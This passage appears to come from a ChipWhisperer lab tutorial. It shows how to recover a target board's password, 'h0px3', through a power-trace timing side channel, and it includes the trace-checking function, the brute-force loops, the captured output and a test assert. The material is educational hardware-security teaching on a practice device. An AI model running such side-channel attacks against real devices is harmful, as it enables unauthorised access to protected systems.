AvT8AAAAAAACmPwAAAAAAAKg/AAAAAACAwj8AAAAAAACuPwAAAAAAALK/AAAAAADA3z8AAAAAAIDXPwAAAAAAAKQ/AAAAAAAA3z8AAAAAAADJPwAAAAAAAL4/AAAAAAAAoj8AAAAAAACqPwAAAAAAgMQ/AAAAAAAAsT8AAAAAAACwvw==","dtype":"float64","shape":[800]}},"selected":{"id":"1161","type":"Selection"},"selection_policy":{"id":"1162","type":"UnionRenderers"}},"id":"1136","type":"ColumnDataSource"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1143","type":"Line"},{"attributes":{"callback":null},"id":"1105","type":"DataRange1d"},{"attributes":{"source":{"id":"1141","type":"ColumnDataSource"}},"id":"1145","type":"CDSView"},{"attributes":{"data_source":{"id":"1141","type":"ColumnDataSource"},"glyph":{"id":"1142","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1143","type":"Line"},"selection_glyph":null,"view":{"id":"1145","type":"CDSView"}},"id":"1144","type":"GlyphRenderer"},{"attributes":{},"id":"1109","type":"LinearScale"},{"attributes":{},"id":"1112","type":"BasicTicker"},{"attributes":{},"id":"1117","type":"BasicTicker"},{"attributes":{"text":""},"id":"1155","type":"Title"},{"attributes":{"formatter":{"id":"1159","type":"BasicTickFormatter"},"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1111","type":"LinearAxis"},{"attributes":{},"id":"1159","type":"BasicTickFormatter"},{"attributes":{},"id":"1157","type":"BasicTickFormatter"},{"attributes":{},"id":"1161","type":"Selection"},{"attributes":{},"id":"1164","type":"UnionRenderers"},{"attributes":{"callback":null},"id":"1103","type":"DataRange1d"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1165","type":"BoxAnnotation"},{"attributes":{},"id":"1163","type":"Selection"},{"attributes":{},"id":"1162","type":"UnionRenderers"},{"attributes":{},"id":"1107","type":"LinearScale"}],"root_ids":["1102"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"a29729c2-c242-4765-acaa-bde78ff91155","roots":{"1102":"e8844ecf-6d85-4abe-8be8-28ed2fb2c286"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

You should see both traces start and end similarly, but differ
elsewhere. If you look closely, you should see that the blue trace looks
a lot like the red trace but shifted later in time. We'll use this
timing difference to break the password!

Edit the above block to try different passwords and see how it changes
for different lengths and number of correct characters.

Go back to the original guesses (``"\n"`` and ``"h\n"``) and find some
distinct spikes that get shifted in time. Your target may differ, but in
my case, there were some distinct spikes of about -0.21 at 217 in red
and 253 in blue. The plot is interactive, so you can zoom in and move
around using the buttons on the right side of the plot. Record their
locations, value, and the difference in location (in my case, 217, 253,
-0.21, and 36).

Attacking a Single Letter
-------------------------

Now that we've located a distinctive timing difference, we can start
building our attack. We'll start with a single letter, since that will
quickly give us some feedback on the attack.

The plan for the attack is simple: keep guessing letters until we no
longer see the distinctive spike in the original location. To do this,
we'll create a loop that:

-  Figures out our next guess
-  Does the capture and records the trace
-  Checks if sample 217 is larger than -0.2 (replace with appropriate
   values)

To make things a little easier for later, we'll make a function that
will return whether our spike is (guess incorrect) or isn't (guess
correct) in the right location:


**In [15]:**

.. code:: ipython3

    def checkpass(trace, i):
        if PLATFORM == "CWNANO":
            #There's a bit of jitter
            return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)
        elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
            return trace[229 + 36*i] > -0.2
        elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            return trace[121 + 72 * i] > -0.3

The below loop finds the first correct character, prints it, then ends.
You should see "Success: h" after a while.


**In [16]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for c in trylist:
        next_pass = password + c + "\n"
        trace = cap_pass_trace(next_pass)
        if checkpass(trace, 0):
            print("Success: " + c)
            break


**Out [16]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success: h
    


Attacking the Full Password
---------------------------

Now that we can guess a single character, attacking the rest is easy; we
just need to repeat the process in another loop, move the check point
(this is the change is location you recorded earlier), and update our
guess with the new correct letter.

After updating the below script and running it, you should see parts of
the password printed out as each letter is found.


**In [17]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for i in range(5):
        for c in trylist:
            next_pass = password + c + "\n"
            trace = cap_pass_trace(next_pass)
            if checkpass(trace, i):
                password += c
                print("Success, pass now {}".format(password))
                break


**Out [17]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0p
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0px
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0px3
    


That's it! You should have successfully cracked a password using the
timing attack. Some notes on this method:

-  The target device has a finite start-up time, which slows down the
   attack. If you wish, remove some of the ``printf()``'s from the
   target code, recompile and reprogram, and see how quickly you can do
   this attack.
-  The current script doesn't look for the "WELCOME" message when the
   password is OK. That is an extension that allows it to crack any size
   password.
-  If there was a lock-out on a wrong password, the system would ignore
   it, as it resets the target after every attempt.

Conclusion
----------

This tutorial has demonstrated the use of the power side-channel for
performing timing attacks. A target with a simple password-based
security system is broken.


**In [18]:**

.. code:: ipython3

    scope.dis()
    target.dis()

Tests
-----


**In [19]:**

.. code:: ipython3

    assert (password == "h0px3"), "Failed to break password, got {}.\nIf on Nano, may need to rerun".format(password)


**In [ ]:**

